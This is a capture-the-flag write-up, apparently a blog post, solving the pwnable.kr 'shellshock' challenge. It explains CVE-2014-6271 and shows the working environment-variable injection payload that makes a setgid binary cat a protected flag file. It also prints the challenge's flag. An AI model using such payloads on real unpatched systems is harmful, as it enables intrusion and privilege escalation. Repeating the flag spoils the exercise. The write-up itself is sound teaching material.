---
author: george_pick
layout: post
title: "CVE-2014-6271: ShellShock"
excerpt: "As Wiz Khalifa once said: Knock, knock you about to get SHELLSHOCKED!"
categories: [pwn practice]
---

> Mommy, there was a shocking news about bash.
>
> I bet you already know, but lets just make it sure :)
>
> `ssh shellshock@pwnable.kr -p2222 (pw:guest)`

## Given

All we're given in this is a ssh login command, and it's password:

* `ssh shellshock@pwnable.kr -p2222 (pw:guest)`

The tittle of the challenge, combined with the hint suggests we're going to be dealing with something relating to "shellshock" and Bash.

Some quick googling for "Bash shellshock" leads us to the following:
* [National Vulnerability Database on CVE-2014-6271 (a.k.a "ShellShock")](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
* [Wikipedia page on ShellShock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))

OK - so it seems like we're going to have to take advantage of a vulnerable bash binary, by storing a command inside an environment variable that will get unintentionally executed?

## First, lets get on the box

```bash
...
shellshock@pwnable:~$
```

OK - we're on.

## Look around

```
...
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
...
```

OK - so we have our flag file, a binary, it's source code, and an executable "bash". I imagine this is a specific version of bash that is vulnerable, as opposed to the system itself running that version, because that'd be bad :)

We can check. System's bash version:

```bash
bash --version
GNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

vs the given `bash` binary's version:

```bash
./bash --version
GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

Ooof - 2011. From the mentioned wikipedia page, we can use the command given from the initial report to test for vulnerability:

System:

```bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test
```

Vs given:

```bash
env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
vulnerable
this is a test
```

Yeet!

## Inspect files

Running the binary just yields:

```bash
./shellshock
shock_me
```
And then it quits.

Looking at the source code:

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

setresuid [man page](http://man7.org/linux/man-pages/man2/setresgid.2.html):
>
> ```
>       int setresuid(uid_t ruid, uid_t euid, uid_t suid);
>       int setresgid(gid_t rgid, gid_t egid, gid_t sgid);
> ```
>
> `setresuid()` sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
>
> `setresgid()` sets the real GID, effective GID, and saved set-group-ID of the calling process

If we look at the `shellshock` binary:

```bash
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
```

We see it has the same ownership/access as our flag file:

```bash
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
```

So, from the `shellshock` binary's user+group, we'd be able to just `cat` the flag (which we can't do as the default shellshock user).

## Takeaway
We need to arbitrarily get the `shellshock` program to execute a `cat /home/shellshock/flag`.


## Closer look at the ShellShock vulnerability
[This](https://fedoramagazine.org/shellshock-how-does-it-actually-work/) Fedora Magazine article does a pretty good job of explaining in layman's terms what the vulnerability is; I'd recommend reading it.

In a nutshell:
* Bash is what we see as a terminal prompt, but also scripting language
* Can define functions, accordingly
* Can use `bash -c` to run a command in a new instance/subprocess of bash.
* This only inherits **the user's environment**, not function definitions (instead, use `export -f <func>; bash -c <cmd>`)

_However_, how bash does this is sketchy because the subprocess still has no notion of inheriting functions, only environment variables. So it needs to create just a regular ol' bash environment variable with our function.

The vulnerability is that bash didn't actually stop after it read a functions (i.e. environment variable) definition. So you could shove additional commands/anything you want and they'd be executed.

That's why the following prints both echo statements:

```bash
env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
vulnerable
this is a test
```

We define our "function":

```bash
() { :;}; ...
```

Which is just a nameless function that does nothing (`:`) and that's it. However, we then add it's closing brace and `;`, after which we inject our "attack" (becuase _we can_):

```bash
... echo vulnerable' ...
```

Then, we specify our subprocess, which will need to inherit this new environment variable, and in the process, executing our attack:

```bash
... ./bash -c "echo this is a test"
```

Altogether:

```bash
env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
---------------  ---------------  -------------------------------
 env variable     attack that                   subprocess that is to load our
  to 'inherit'    gets executed                 totally legit "environment variable"
                  bc the vuln
                  when reading env vars
```

So, then, it's clear what we need to get the shellshock to spit out our flag:
* "Attack" is to cat the flag file
* subprocess is to run the shellshock file, which gets the proper user/group access to the file

```bash
env x='() { :;}; /bin/cat /home/shellshock/flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```

Flag is `only if I knew CVE-2014-6271 ten years ago..!!`
